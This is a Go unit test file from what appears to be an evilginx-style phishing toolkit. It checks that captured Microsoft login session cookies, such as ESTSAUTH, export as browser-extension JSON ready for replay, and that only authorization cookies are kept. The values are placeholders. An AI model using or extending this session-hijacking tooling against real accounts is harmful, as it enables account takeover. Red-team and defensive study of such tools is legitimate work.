package storage

import (
	"encoding/json"
	"testing"
	"time"
)

// TestCookieEditorExport verifies the evilginx-compatible Cookie-Editor /
// EditThisCookie JSON export: the real cookie domain (incl. leading dot) is
// preserved, SameSite is normalized to the extension vocabulary, hostOnly is
// derived from the domain, and persistent cookies carry an expirationDate
// while session cookies omit it.
func TestCookieEditorExport(t *testing.T) {
	exp := time.Date(2030, 1, 1, 0, 0, 0, 0, time.UTC)
	s := &CapturedSession{
		ID:       "sess1",
		TargetID: "microsoft",
		Cookies: map[string][]CapturedCookie{
			"ESTSAUTH": {{
				Name: "ESTSAUTH", Value: "v1",
				Domain: ".login.microsoftonline.com", Path: "/",
				Secure: true, HttpOnly: true, SameSite: "None", Expiry: exp,
			}},
			"fpc": {{
				Name: "fpc", Value: "v2",
				Domain: "login.microsoftonline.com", Path: "/",
				Secure: true, HttpOnly: false, SameSite: "Lax",
			}},
		},
	}
	b, err := s.CookiesJSON()
	if err != nil {
		t.Fatalf("CookiesJSON: %v", err)
	}
	var entries []map[string]interface{}
	if err := json.Unmarshal(b, &entries); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if len(entries) != 2 {
		t.Fatalf("expected 2 entries, got %d", len(entries))
	}
	byName := map[string]map[string]interface{}{}
	for _, e := range entries {
		byName[e["name"].(string)] = e
	}

	est := byName["ESTSAUTH"]
	if est["domain"] != ".login.microsoftonline.com" {
		t.Errorf("ESTSAUTH domain: got %v", est["domain"])
	}
	if est["sameSite"] != "no_restriction" {
		t.Errorf("ESTSAUTH sameSite: got %v", est["sameSite"])
	}
	if est["hostOnly"] != nil {
		t.Errorf("ESTSAUTH hostOnly should be omitted (leading-dot => not hostOnly), got %v", est["hostOnly"])
	}
	if int64(est["expirationDate"].(float64)) != exp.Unix() {
		t.Errorf("ESTSAUTH expirationDate: got %v want %d", est["expirationDate"], exp.Unix())
	}

	fpc := byName["fpc"]
	if fpc["hostOnly"] != true {
		t.Errorf("fpc hostOnly: got %v", fpc["hostOnly"])
	}
	if fpc["sameSite"] != "lax" {
		t.Errorf("fpc sameSite: got %v", fpc["sameSite"])
	}
	if _, ok := fpc["expirationDate"]; ok {
		t.Errorf("fpc should omit expirationDate (session cookie)")
	}
}

// TestAuthCookiesJSONOnly exports only the persistent session/authorization
// cookies, never the full cookie bag.
func TestAuthCookiesJSONOnly(t *testing.T) {
	s := &CapturedSession{
		ID: "sess2",
		Cookies: map[string][]CapturedCookie{
			"ESTSAUTH":        {{Name: "ESTSAUTH", Value: "v1", Domain: ".login.microsoftonline.com"}},
			"SomePrefCookie":  {{Name: "SomePrefCookie", Value: "x", Domain: ".login.microsoftonline.com"}},
		},
	}
	b, err := s.AuthCookiesJSON()
	if err != nil {
		t.Fatalf("AuthCookiesJSON: %v", err)
	}
	var entries []map[string]interface{}
	if err := json.Unmarshal(b, &entries); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if len(entries) != 1 {
		t.Fatalf("expected only 1 auth cookie, got %d", len(entries))
	}
	if entries[0]["name"] != "ESTSAUTH" {
		t.Errorf("expected ESTSAUTH, got %v", entries[0]["name"])
	}
}
